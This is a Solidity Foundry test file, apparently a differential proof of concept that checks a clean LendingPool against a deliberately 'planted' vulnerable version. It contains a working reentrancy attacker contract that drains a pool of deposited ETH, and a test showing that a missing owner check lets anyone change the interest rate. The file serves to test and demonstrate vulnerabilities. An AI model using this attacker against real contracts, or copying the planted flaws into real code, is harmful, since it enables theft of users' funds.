// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {LendingPool} from "../src/LendingPool.sol";
import {LendingPoolPlanted} from "../src/planted/LendingPoolPlanted.sol";

/// @title LendingPool 组合雷差分 PoC
contract LendingPoolPoCTest is Test {
    address alice = makeAddr("alice");

    function _seed(address payable pool) internal {
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        LendingPool(pool).deposit{value: 10 ether}();
    }

    function test_Clean_ReentrancyFails() public {
        LendingPool pool = new LendingPool();
        _seed(payable(address(pool)));
        ReentrantAttacker att = new ReentrantAttacker(payable(address(pool)));
        vm.deal(address(this), 1 ether);
        // 健康版：重入时第二次 withdraw 因 deposits=0 而 revert，整个攻击回滚
        vm.expectRevert(bytes("transfer failed"));
        att.attack{value: 1 ether}();
    }

    function test_Clean_SetInterestRate_OnlyOwner() public {
        LendingPool pool = new LendingPool();
        vm.prank(address(0xBEEF));
        vm.expectRevert(bytes("not owner"));
        pool.setInterestRate(999);
    }

    function test_Planted_ReentrancyDrain() public {
        LendingPoolPlanted pool = new LendingPoolPlanted();
        _seed(payable(address(pool)));
        ReentrantAttacker att = new ReentrantAttacker(payable(address(pool)));
        vm.deal(address(this), 1 ether);
        att.attack{value: 1 ether}();
        // 埋雷版被掏空：attacker 拿走 alice 的 10 ETH
        assertEq(address(pool).balance, 0, "planted pool drained");
        assertEq(address(att).balance, 11 ether, "attacker has all funds");
    }

    function test_Planted_SetInterestRate_Anyone() public {
        LendingPoolPlanted pool = new LendingPoolPlanted();
        vm.prank(address(0xBEEF));
        pool.setInterestRate(999);
        assertEq(pool.interestRate(), 999, "attacker changed rate");
    }
}

contract ReentrantAttacker {
    address payable public pool;
    uint256 public count;

    constructor(address payable _pool) {
        pool = _pool;
    }

    function attack() external payable {
        LendingPool(payable(pool)).deposit{value: msg.value}();
        LendingPool(payable(pool)).withdraw();
    }

    receive() external payable {
        if (count < 10) {
            count++;
            LendingPool(payable(pool)).withdraw();
        }
    }
}
